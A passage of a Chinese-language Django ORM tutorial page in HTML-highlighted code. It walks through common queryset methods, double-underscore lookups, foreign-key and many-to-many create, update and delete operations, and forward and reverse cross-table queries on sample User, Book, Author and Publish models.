    <span class="hljs-comment"># 13.exists()  &#x57FA;&#x672C;&#x7528;&#x4E0D;&#x5230;&#x56E0;&#x4E3A;&#x6570;&#x636E;&#x672C;&#x8EAB;&#x5C31;&#x81EA;&#x5E26;&#x5E03;&#x5C14;&#x503C;  &#x8FD4;&#x56DE;&#x7684;&#x662F;&#x5E03;&#x5C14;&#x503C;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(pk=10).exists()</span>
    <span class="hljs-comment"># print(res)</span>
</code></pre>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> django.test <span class="hljs-keyword">import</span> TestCase

<span class="hljs-comment"># Create your tests here.</span>
<span class="hljs-keyword">import</span> os


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    os.environ.setdefault(<span class="hljs-string">&quot;DJANGO_SETTINGS_MODULE&quot;</span>, <span class="hljs-string">&quot;day64.settings&quot;</span>)
    <span class="hljs-keyword">import</span> django
    django.setup()
    <span class="hljs-comment"># &#x6240;&#x6709;&#x7684;&#x4EE3;&#x7801;&#x90FD;&#x5FC5;&#x987B;&#x7B49;&#x5F85;&#x73AF;&#x5883;&#x51C6;&#x5907;&#x5B8C;&#x6BD5;&#x4E4B;&#x540E;&#x624D;&#x80FD;&#x4E66;&#x5199;</span>
    <span class="hljs-keyword">from</span> app01 <span class="hljs-keyword">import</span> models

    <span class="hljs-comment"># &#x589E;</span>
    <span class="hljs-comment"># res = models.User.objects.create(name=&apos;jason&apos;,age=18,register_time=&apos;2002-1-21&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># import datetime</span>
    <span class="hljs-comment"># ctime = datetime.datetime.now()</span>
    <span class="hljs-comment"># user_obj = models.User(name=&apos;egon&apos;,age=84,register_time=ctime)</span>
    <span class="hljs-comment"># user_obj.save()</span>

    <span class="hljs-comment"># &#x5220;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(pk=2).delete()</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    pk&#x4F1A;&#x81EA;&#x52A8;&#x67E5;&#x627E;&#x5230;&#x5F53;&#x524D;&#x8868;&#x7684;&#x4E3B;&#x952E;&#x5B57;&#x6BB5; &#x6307;&#x4EE3;&#x7684;&#x5C31;&#x662F;&#x5F53;&#x524D;&#x8868;&#x7684;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;
    &#x7528;&#x4E86;pk&#x4E4B;&#x540E; &#x4F60;&#x5C31;&#x4E0D;&#x9700;&#x8981;&#x6307;&#x4EE3;&#x5F53;&#x524D;&#x8868;&#x7684;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;&#x5230;&#x5E95;&#x53EB;&#x4EC0;&#x4E48;&#x4E86;
        uid
        pid
        sid
        ...
    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># user_obj = models.User.objects.filter(pk=1).first()</span>
    <span class="hljs-comment"># user_obj.delete()</span>

    <span class="hljs-comment"># &#x4FEE;&#x6539;</span>
    <span class="hljs-comment"># models.User.objects.filter(pk=4).update(name=&apos;egonDSB&apos;)</span>

    <span class="hljs-comment"># user_obj = models.User.objects.get(pk=4)</span>
    <span class="hljs-comment"># user_obj = models.User.objects.filter(pk=6)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    get&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x7684;&#x76F4;&#x63A5;&#x5C31;&#x662F;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5BF9;&#x8C61;
    &#x4F46;&#x662F;&#x8BE5;&#x65B9;&#x6CD5;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;
        &#x4E00;&#x65E6;&#x6570;&#x636E;&#x4E0D;&#x5B58;&#x5728;&#x8BE5;&#x65B9;&#x6CD5;&#x4F1A;&#x76F4;&#x63A5;&#x62A5;&#x9519;
        &#x800C;filter&#x5219;&#x4E0D;&#x4F1A;
            &#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x7528;filter
    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># user_obj.name = &apos;egonPPP&apos;</span>
    <span class="hljs-comment"># user_obj.save()</span>


    <span class="hljs-comment"># &#x5FC5;&#x77E5;&#x5FC5;&#x4F1A;13&#x6761;</span>
    <span class="hljs-comment"># 1.all()  &#x67E5;&#x8BE2;&#x6240;&#x6709;&#x6570;&#x636E;</span>

    <span class="hljs-comment"># 2.filter()     &#x5E26;&#x6709;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6;&#x7684;&#x67E5;&#x8BE2;</span>
    <span class="hljs-comment"># 3.get()        &#x76F4;&#x63A5;&#x62FF;&#x6570;&#x636E;&#x5BF9;&#x8C61; &#x4F46;&#x662F;&#x6761;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x76F4;&#x63A5;&#x62A5;&#x9519;</span>
    <span class="hljs-comment"># 4.first()      &#x62FF;queryset&#x91CC;&#x9762;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;</span>
    <span class="hljs-comment"># res = models.User.objects.all().first()</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># 5.last()</span>
    <span class="hljs-comment"># res = models.User.objects.all().last()</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 6.values()  &#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x83B7;&#x53D6;&#x7684;&#x6570;&#x636E;&#x5B57;&#x6BB5;  select name,age from ...     &#x5217;&#x8868;&#x5957;&#x5B57;&#x5178;</span>
    <span class="hljs-comment"># res = models.User.objects.values(&apos;name&apos;,&apos;age&apos;)  # &lt;QuerySet [{&apos;name&apos;: &apos;jason&apos;, &apos;age&apos;: 18}, {&apos;name&apos;: &apos;egonPPP&apos;, &apos;age&apos;: 84}]&gt;</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># 7.values_list()  &#x5217;&#x8868;&#x5957;&#x5143;&#x7956;</span>
    <span class="hljs-comment"># res = models.User.objects.values_list(&apos;name&apos;,&apos;age&apos;)  # &lt;QuerySet [(&apos;jason&apos;, 18), (&apos;egonPPP&apos;, 84)]&gt;</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># &quot;&quot;&quot;</span>
    <span class="hljs-comment">#  # &#x67E5;&#x770B;&#x5185;&#x90E8;&#x5C01;&#x88C5;&#x7684;sql&#x8BED;&#x53E5;</span>
    <span class="hljs-comment">#  &#x4E0A;&#x8FF0;&#x67E5;&#x770B;sql&#x8BED;&#x53E5;&#x7684;&#x65B9;&#x5F0F;  &#x53EA;&#x80FD;&#x7528;&#x4E8E;queryset&#x5BF9;&#x8C61;</span>
    <span class="hljs-comment">#  &#x53EA;&#x6709;queryset&#x5BF9;&#x8C61;&#x624D;&#x80FD;&#x591F;&#x70B9;&#x51FB;query&#x67E5;&#x770B;&#x5185;&#x90E8;&#x7684;sql&#x8BED;&#x53E5;</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># &quot;&quot;&quot;</span>
    <span class="hljs-comment"># 8.distinct()  &#x53BB;&#x91CD;</span>
    <span class="hljs-comment"># res = models.User.objects.values(&apos;name&apos;,&apos;age&apos;).distinct()</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x53BB;&#x91CD;&#x4E00;&#x5B9A;&#x8981;&#x662F;&#x4E00;&#x6A21;&#x4E00;&#x6837;&#x7684;&#x6570;&#x636E;
    &#x5982;&#x679C;&#x5E26;&#x6709;&#x4E3B;&#x952E;&#x90A3;&#x4E48;&#x80AF;&#x5B9A;&#x4E0D;&#x4E00;&#x6837; &#x4F60;&#x5728;&#x5F80;&#x540E;&#x7684;&#x67E5;&#x8BE2;&#x4E2D;&#x4E00;&#x5B9A;&#x4E0D;&#x8981;&#x5FFD;&#x7565;&#x4E3B;&#x952E;

    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># 9.order_by()</span>
    <span class="hljs-comment"># res = models.User.objects.order_by(&apos;age&apos;)  # &#x9ED8;&#x8BA4;&#x5347;&#x5E8F;</span>
    <span class="hljs-comment"># res = models.User.objects.order_by(&apos;-age&apos;)  # &#x964D;&#x5E8F;</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># 10.reverse()  &#x53CD;&#x8F6C;&#x7684;&#x524D;&#x63D0;&#x662F; &#x6570;&#x636E;&#x5DF2;&#x7ECF;&#x6392;&#x8FC7;&#x5E8F;&#x4E86;  order_by()</span>
    <span class="hljs-comment"># res = models.User.objects.all()</span>
    <span class="hljs-comment"># res1 = models.User.objects.order_by(&apos;age&apos;).reverse()</span>
    <span class="hljs-comment"># print(res,res1)</span>

    <span class="hljs-comment"># 11.count()  &#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x6570;&#x636E;&#x7684;&#x4E2A;&#x6570;</span>
    <span class="hljs-comment"># res = models.User.objects.count()</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># 12.exclude()  &#x6392;&#x9664;&#x5728;&#x5916;</span>
    <span class="hljs-comment"># res = models.User.objects.exclude(name=&apos;jason&apos;)</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 13.exists()  &#x57FA;&#x672C;&#x7528;&#x4E0D;&#x5230;&#x56E0;&#x4E3A;&#x6570;&#x636E;&#x672C;&#x8EAB;&#x5C31;&#x81EA;&#x5E26;&#x5E03;&#x5C14;&#x503C;  &#x8FD4;&#x56DE;&#x7684;&#x662F;&#x5E03;&#x5C14;&#x503C;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(pk=10).exists()</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># &#x795E;&#x5947;&#x7684;&#x53CC;&#x4E0B;&#x5212;&#x7EBF;&#x67E5;&#x8BE2;</span>
    <span class="hljs-comment"># 1 &#x5E74;&#x9F84;&#x5927;&#x4E8E;35&#x5C81;&#x7684;&#x6570;&#x636E;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(age__gt=35)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># 2 &#x5E74;&#x9F84;&#x5C0F;&#x4E8E;35&#x5C81;&#x7684;&#x6570;&#x636E;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(age__lt=35)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># &#x5927;&#x4E8E;&#x7B49;&#x4E8E; &#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(age__gte=32)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># res = models.User.objects.filter(age__lte=32)</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># &#x5E74;&#x9F84;&#x662F;18 &#x6216;&#x8005; 32 &#x6216;&#x8005;40</span>
    <span class="hljs-comment"># res = models.User.objects.filter(age__in=[18,32,40])</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># &#x5E74;&#x9F84;&#x5728;18&#x5230;40&#x5C81;&#x4E4B;&#x95F4;&#x7684;  &#x9996;&#x5C3E;&#x90FD;&#x8981;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(age__range=[18,40])</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># &#x67E5;&#x8BE2;&#x51FA;&#x540D;&#x5B57;&#x91CC;&#x9762;&#x542B;&#x6709;s&#x7684;&#x6570;&#x636E;  &#x6A21;&#x7CCA;&#x67E5;&#x8BE2;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(name__contains=&apos;s&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># &#x662F;&#x5426;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;  &#x67E5;&#x8BE2;&#x51FA;&#x540D;&#x5B57;&#x91CC;&#x9762;&#x542B;&#x6709;p&#x7684;&#x6570;&#x636E;  &#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(name__contains=&apos;p&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># &#x5FFD;&#x7565;&#x5927;&#x5C0F;&#x5199;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(name__icontains=&apos;p&apos;)</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># res = models.User.objects.filter(name__startswith=&apos;j&apos;)</span>
    <span class="hljs-comment"># res1 = models.User.objects.filter(name__endswith=&apos;j&apos;)</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># print(res,res1)</span>


    <span class="hljs-comment"># &#x67E5;&#x8BE2;&#x51FA;&#x6CE8;&#x518C;&#x65F6;&#x95F4;&#x662F; 2020 1&#x6708;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(register_time__month=&apos;1&apos;)</span>
    <span class="hljs-comment"># res = models.User.objects.filter(register_time__year=&apos;2020&apos;)</span>



    <span class="hljs-comment"># &#x4E00;&#x5BF9;&#x591A;&#x5916;&#x952E;&#x589E;&#x5220;&#x6539;&#x67E5;</span>
    <span class="hljs-comment"># &#x589E;</span>
    <span class="hljs-comment"># 1  &#x76F4;&#x63A5;&#x5199;&#x5B9E;&#x9645;&#x5B57;&#x6BB5; id</span>
    <span class="hljs-comment"># models.Book.objects.create(title=&apos;&#x8BBA;&#x8BED;&apos;,price=899.23,publish_id=1)</span>
    <span class="hljs-comment"># models.Book.objects.create(title=&apos;&#x804A;&#x658B;&apos;,price=444.23,publish_id=2)</span>
    <span class="hljs-comment"># models.Book.objects.create(title=&apos;&#x8001;&#x5B50;&apos;,price=333.66,publish_id=1)</span>
    <span class="hljs-comment"># 2  &#x865A;&#x62DF;&#x5B57;&#x6BB5; &#x5BF9;&#x8C61;</span>
    <span class="hljs-comment"># publish_obj = models.Publish.objects.filter(pk=2).first()</span>
    <span class="hljs-comment"># models.Book.objects.create(title=&apos;&#x7EA2;&#x697C;&#x68A6;&apos;,price=666.23,publish=publish_obj)</span>

    <span class="hljs-comment"># &#x5220;</span>
    <span class="hljs-comment"># models.Publish.objects.filter(pk=1).delete()  # &#x7EA7;&#x8054;&#x5220;&#x9664;</span>

    <span class="hljs-comment"># &#x4FEE;&#x6539;</span>
    <span class="hljs-comment"># models.Book.objects.filter(pk=1).update(publish_id=2)</span>
    <span class="hljs-comment"># publish_obj = models.Publish.objects.filter(pk=1).first()</span>
    <span class="hljs-comment"># models.Book.objects.filter(pk=1).update(publish=publish_obj)</span>


    <span class="hljs-comment"># &#x591A;&#x5BF9;&#x591A;  &#x589E;&#x5220;&#x6539;&#x67E5;  &#x5C31;&#x662F;&#x5728;&#x64CD;&#x4F5C;&#x7B2C;&#x4E09;&#x5F20;&#x8868;</span>

    <span class="hljs-comment"># &#x5982;&#x4F55;&#x7ED9;&#x4E66;&#x7C4D;&#x6DFB;&#x52A0;&#x4F5C;&#x8005;&#xFF1F;</span>
    <span class="hljs-comment"># book_obj = models.Book.objects.filter(pk=1).first()</span>
    <span class="hljs-comment"># print(book_obj.authors)  # &#x5C31;&#x7C7B;&#x4F3C;&#x4E8E;&#x4F60;&#x5DF2;&#x7ECF;&#x5230;&#x4E86;&#x7B2C;&#x4E09;&#x5F20;&#x5173;&#x7CFB;&#x8868;&#x4E86;</span>
    <span class="hljs-comment"># book_obj.authors.add(1)  # &#x4E66;&#x7C4D;id&#x4E3A;1&#x7684;&#x4E66;&#x7C4D;&#x7ED1;&#x5B9A;&#x4E00;&#x4E2A;&#x4E3B;&#x952E;&#x4E3A;1 &#x7684;&#x4F5C;&#x8005;</span>
    <span class="hljs-comment"># book_obj.authors.add(2,3)</span>

    <span class="hljs-comment"># author_obj = models.Author.objects.filter(pk=1).first()</span>
    <span class="hljs-comment"># author_obj1 = models.Author.objects.filter(pk=2).first()</span>
    <span class="hljs-comment"># author_obj2 = models.Author.objects.filter(pk=3).first()</span>
    <span class="hljs-comment"># book_obj.authors.add(author_obj)</span>
    <span class="hljs-comment"># book_obj.authors.add(author_obj1,author_obj2)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    add&#x7ED9;&#x7B2C;&#x4E09;&#x5F20;&#x5173;&#x7CFB;&#x8868;&#x6DFB;&#x52A0;&#x6570;&#x636E;
        &#x62EC;&#x53F7;&#x5185;&#x65E2;&#x53EF;&#x4EE5;&#x4F20;&#x6570;&#x5B57;&#x4E5F;&#x53EF;&#x4EE5;&#x4F20;&#x5BF9;&#x8C61; &#x5E76;&#x4E14;&#x90FD;&#x652F;&#x6301;&#x591A;&#x4E2A;
    &quot;&quot;&quot;</span>

    <span class="hljs-comment"># &#x5220;</span>
    <span class="hljs-comment"># book_obj.authors.remove(2)</span>
    <span class="hljs-comment"># book_obj.authors.remove(1,3)</span>

    <span class="hljs-comment"># author_obj = models.Author.objects.filter(pk=2).first()</span>
    <span class="hljs-comment"># author_obj1 = models.Author.objects.filter(pk=3).first()</span>
    <span class="hljs-comment"># book_obj.authors.remove(author_obj,author_obj1)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    remove
        &#x62EC;&#x53F7;&#x5185;&#x65E2;&#x53EF;&#x4EE5;&#x4F20;&#x6570;&#x5B57;&#x4E5F;&#x53EF;&#x4EE5;&#x4F20;&#x5BF9;&#x8C61; &#x5E76;&#x4E14;&#x90FD;&#x652F;&#x6301;&#x591A;&#x4E2A;
    &quot;&quot;&quot;</span>


    <span class="hljs-comment"># &#x4FEE;&#x6539;</span>
    <span class="hljs-comment"># book_obj.authors.set([1,2])  # &#x62EC;&#x53F7;&#x5185;&#x5FC5;&#x987B;&#x7ED9;&#x4E00;&#x4E2A;&#x53EF;&#x8FED;&#x4EE3;&#x5BF9;&#x8C61;</span>
    <span class="hljs-comment"># book_obj.authors.set([3])  # &#x62EC;&#x53F7;&#x5185;&#x5FC5;&#x987B;&#x7ED9;&#x4E00;&#x4E2A;&#x53EF;&#x8FED;&#x4EE3;&#x5BF9;&#x8C61;</span>

    <span class="hljs-comment"># author_obj = models.Author.objects.filter(pk=2).first()</span>
    <span class="hljs-comment"># author_obj1 = models.Author.objects.filter(pk=3).first()</span>
    <span class="hljs-comment"># book_obj.authors.set([author_obj,author_obj1])  # &#x62EC;&#x53F7;&#x5185;&#x5FC5;&#x987B;&#x7ED9;&#x4E00;&#x4E2A;&#x53EF;&#x8FED;&#x4EE3;&#x5BF9;&#x8C61;</span>

    <span class="hljs-string">&quot;&quot;&quot;
    set
        &#x62EC;&#x53F7;&#x5185;&#x5FC5;&#x987B;&#x4F20;&#x4E00;&#x4E2A;&#x53EF;&#x8FED;&#x4EE3;&#x5BF9;&#x8C61;&#xFF0C;&#x8BE5;&#x5BF9;&#x8C61;&#x5185;&#x65E2;&#x53EF;&#x4EE5;&#x6570;&#x5B57;&#x4E5F;&#x53EF;&#x4EE5;&#x5BF9;&#x8C61; &#x5E76;&#x4E14;&#x90FD;&#x652F;&#x6301;&#x591A;&#x4E2A;
    &quot;&quot;&quot;</span>


    <span class="hljs-comment"># &#x6E05;&#x7A7A;</span>
    <span class="hljs-comment"># &#x5728;&#x7B2C;&#x4E09;&#x5F20;&#x5173;&#x7CFB;&#x8868;&#x4E2D;&#x6E05;&#x7A7A;&#x67D0;&#x4E2A;&#x4E66;&#x7C4D;&#x4E0E;&#x4F5C;&#x8005;&#x7684;&#x7ED1;&#x5B9A;&#x5173;&#x7CFB;</span>
    <span class="hljs-comment"># book_obj.authors.clear()</span>
    <span class="hljs-string">&quot;&quot;&quot;
    clear
        &#x62EC;&#x53F7;&#x5185;&#x4E0D;&#x8981;&#x52A0;&#x4EFB;&#x4F55;&#x53C2;&#x6570;

    &quot;&quot;&quot;</span>

    <span class="hljs-comment"># &#x57FA;&#x4E8E;&#x5BF9;&#x8C61;&#x7684;&#x8DE8;&#x8868;&#x67E5;&#x8BE2;</span>

    <span class="hljs-comment"># 1.&#x67E5;&#x8BE2;&#x4E66;&#x7C4D;&#x4E3B;&#x952E;&#x4E3A;1&#x7684;&#x51FA;&#x7248;&#x793E;</span>
    <span class="hljs-comment"># book_obj = models.Book.objects.filter(pk=1).first()</span>
    <span class="hljs-comment"># # &#x4E66;&#x67E5;&#x51FA;&#x7248;&#x793E; &#x6B63;&#x5411;</span>
    <span class="hljs-comment"># res = book_obj.publish</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># print(res.name)</span>
    <span class="hljs-comment"># print(res.addr)</span>

    <span class="hljs-comment"># 2.&#x67E5;&#x8BE2;&#x4E66;&#x7C4D;&#x4E3B;&#x952E;&#x4E3A;2&#x7684;&#x4F5C;&#x8005;</span>
    <span class="hljs-comment"># book_obj = models.Book.objects.filter(pk=2).first()</span>
    <span class="hljs-comment"># # &#x4E66;&#x67E5;&#x4F5C;&#x8005; &#x6B63;&#x5411;</span>
    <span class="hljs-comment"># # res = book_obj.authors  # app01.Author.None</span>
    <span class="hljs-comment"># res = book_obj.authors.all()  # &lt;QuerySet [&lt;Author: Author object&gt;, &lt;Author: Author object&gt;]&gt;</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 3.&#x67E5;&#x8BE2;&#x4F5C;&#x8005;jason&#x7684;&#x7535;&#x8BDD;&#x53F7;&#x7801;</span>
    <span class="hljs-comment"># author_obj = models.Author.objects.filter(name=&apos;jason&apos;).first()</span>
    <span class="hljs-comment"># res = author_obj.author_detail</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># print(res.phone)</span>
    <span class="hljs-comment"># print(res.addr)</span>

    <span class="hljs-string">&quot;&quot;&quot;
    &#x5728;&#x4E66;&#x5199;orm&#x8BED;&#x53E5;&#x7684;&#x65F6;&#x5019;&#x8DDF;&#x5199;sql&#x8BED;&#x53E5;&#x4E00;&#x6837;&#x7684;
    &#x4E0D;&#x8981;&#x4F01;&#x56FE;&#x4E00;&#x6B21;&#x6027;&#x5C06;orm&#x8BED;&#x53E5;&#x5199;&#x5B8C; &#x5982;&#x679C;&#x6BD4;&#x8F83;&#x590D;&#x6742; &#x5C31;&#x5199;&#x4E00;&#x70B9;&#x770B;&#x4E00;&#x70B9;

    &#x6B63;&#x5411;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x9700;&#x8981;&#x52A0;.all()
        &#x5F53;&#x4F60;&#x7684;&#x7ED3;&#x679C;&#x53EF;&#x80FD;&#x6709;&#x591A;&#x4E2A;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x9700;&#x8981;&#x52A0;.all()
        &#x5982;&#x679C;&#x662F;&#x4E00;&#x4E2A;&#x5219;&#x76F4;&#x63A5;&#x62FF;&#x5230;&#x6570;&#x636E;&#x5BF9;&#x8C61;
            book_obj.publish
            book_obj.authors.all()
            author_obj.author_detail
    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># 4.&#x67E5;&#x8BE2;&#x51FA;&#x7248;&#x793E;&#x662F;&#x4E1C;&#x65B9;&#x51FA;&#x7248;&#x793E;&#x51FA;&#x7248;&#x7684;&#x4E66;</span>
    <span class="hljs-comment"># publish_obj = models.Publish.objects.filter(name=&apos;&#x4E1C;&#x65B9;&#x51FA;&#x7248;&#x793E;&apos;).first()</span>
    <span class="hljs-comment"># &#x51FA;&#x7248;&#x793E;&#x67E5;&#x4E66;  &#x53CD;&#x5411;</span>
    <span class="hljs-comment"># res = publish_obj.book_set  # app01.Book.None</span>
    <span class="hljs-comment"># res = publish_obj.book_set.all()</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 5.&#x67E5;&#x8BE2;&#x4F5C;&#x8005;&#x662F;jason&#x5199;&#x8FC7;&#x7684;&#x4E66;</span>
    <span class="hljs-comment"># author_obj = models.Author.objects.filter(name=&apos;jason&apos;).first()</span>
    <span class="hljs-comment"># &#x4F5C;&#x8005;&#x67E5;&#x4E66;      &#x53CD;&#x5411;</span>
    <span class="hljs-comment"># res = author_obj.book_set  # app01.Book.None</span>
    <span class="hljs-comment"># res = author_obj.book_set.all()</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 6.&#x67E5;&#x8BE2;&#x624B;&#x673A;&#x53F7;&#x662F;110&#x7684;&#x4F5C;&#x8005;&#x59D3;&#x540D;</span>
    <span class="hljs-comment"># author_detail_obj = models.AuthorDetail.objects.filter(phone=110).first()</span>
    <span class="hljs-comment"># res = author_detail_obj.author</span>
    <span class="hljs-comment"># print(res.name)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x57FA;&#x4E8E;&#x5BF9;&#x8C61; 
        &#x53CD;&#x5411;&#x67E5;&#x8BE2;&#x7684;&#x65F6;&#x5019;
            &#x5F53;&#x4F60;&#x7684;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;&#x7684;&#x65F6;&#x5019; &#x5C31;&#x5FC5;&#x987B;&#x52A0;_set.all()
            &#x5F53;&#x4F60;&#x7684;&#x7ED3;&#x679C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x7684;&#x65F6;&#x5019; &#x4E0D;&#x9700;&#x8981;&#x52A0;_set.all()
        &#x81EA;&#x5DF1;&#x603B;&#x7ED3;&#x51FA; &#x81EA;&#x5DF1;&#x65B9;&#x4FBF;&#x8BB0;&#x5FC6;&#x7684;&#x5373;&#x53EF; &#x6BCF;&#x4E2A;&#x4EBA;&#x90FD;&#x53EF;&#x4EE5;&#x4E0D;&#x4E00;&#x6837;
    &quot;&quot;&quot;</span>


    <span class="hljs-comment"># &#x57FA;&#x4E8E;&#x53CC;&#x4E0B;&#x5212;&#x7EBF;&#x7684;&#x8DE8;&#x8868;&#x67E5;&#x8BE2;</span>


    <span class="hljs-comment"># 1.&#x67E5;&#x8BE2;jason&#x7684;&#x624B;&#x673A;&#x53F7;&#x548C;&#x4F5C;&#x8005;&#x59D3;&#x540D;</span>
    <span class="hljs-comment"># res = models.Author.objects.filter(name=&apos;jason&apos;).values(&apos;author_detail__phone&apos;,&apos;name&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># &#x53CD;&#x5411;</span>
    <span class="hljs-comment"># res = models.AuthorDetail.objects.filter(author__name=&apos;jason&apos;)  # &#x62FF;&#x4F5C;&#x8005;&#x59D3;&#x540D;&#x662F;jason&#x7684;&#x4F5C;&#x8005;&#x8BE6;&#x60C5;</span>
    <span class="hljs-comment"># res = models.AuthorDetail.objects.filter(author__name=&apos;jason&apos;).values(&apos;phone&apos;,&apos;author__name&apos;)</span>
    <span class="hljs-comment"># print(res)</span>


    <span class="hljs-comment"># 2.&#x67E5;&#x8BE2;&#x4E66;&#x7C4D;&#x4E3B;&#x952E;&#x4E3A;1&#x7684;&#x51FA;&#x7248;&#x793E;&#x540D;&#x79F0;&#x548C;&#x4E66;&#x7684;&#x540D;&#x79F0;</span>
    <span class="hljs-comment"># res = models.Book.objects.filter(pk=1).values(&apos;title&apos;,&apos;publish__name&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># &#x53CD;&#x5411;</span>
    <span class="hljs-comment"># res = models.Publish.objects.filter(book__id=1).values(&apos;name&apos;,&apos;book__title&apos;)</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 3.&#x67E5;&#x8BE2;&#x4E66;&#x7C4D;&#x4E3B;&#x952E;&#x4E3A;1&#x7684;&#x4F5C;&#x8005;&#x59D3;&#x540D;</span>
    <span class="hljs-comment"># res = models.Book.objects.filter(pk=1).values(&apos;authors__name&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># &#x53CD;&#x5411;</span>
    <span class="hljs-comment"># res = models.Author.objects.filter(book__id=1).values(&apos;name&apos;)</span>
    <span class="hljs-comment"># print(res)</span>


    <span class="hljs-comment"># &#x67E5;&#x8BE2;&#x4E66;&#x7C4D;&#x4E3B;&#x952E;&#x662F;1&#x7684;&#x4F5C;&#x8005;&#x7684;&#x624B;&#x673A;&#x53F7;</span>
    <span class="hljs-comment"># book author authordetail</span>
    <span class="hljs-comment"># res = models.Book.objects.filter(pk=1).values(&apos;authors__author_detail__phone&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x4F60;&#x53EA;&#x8981;&#x638C;&#x63E1;&#x4E86;&#x6B63;&#x53CD;&#x5411;&#x7684;&#x6982;&#x5FF5;
    &#x4EE5;&#x53CA;&#x53CC;&#x4E0B;&#x5212;&#x7EBF;
    &#x90A3;&#x4E48;&#x4F60;&#x5C31;&#x53EF;&#x4EE5;&#x65E0;&#x9650;&#x5236;&#x7684;&#x8DE8;&#x8868;

    &quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x6D4B;&#x8BD5;&#x811A;&#x672C;">&#x6D4B;&#x8BD5;&#x811A;&#x672C;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x5F53;&#x4F60;&#x53EA;&#x662F;&#x60F3;&#x6D4B;&#x8BD5;django&#x4E2D;&#x7684;&#x67D0;&#x4E00;&#x4E2A;py&#x6587;&#x4EF6;&#x5185;&#x5BB9; &#x90A3;&#x4E48;&#x4F60;&#x53EF;&#x4EE5;&#x4E0D;&#x7528;&#x4E66;&#x5199;&#x524D;&#x540E;&#x7AEF;&#x4EA4;&#x4E92;&#x7684;&#x5F62;&#x5F0F;
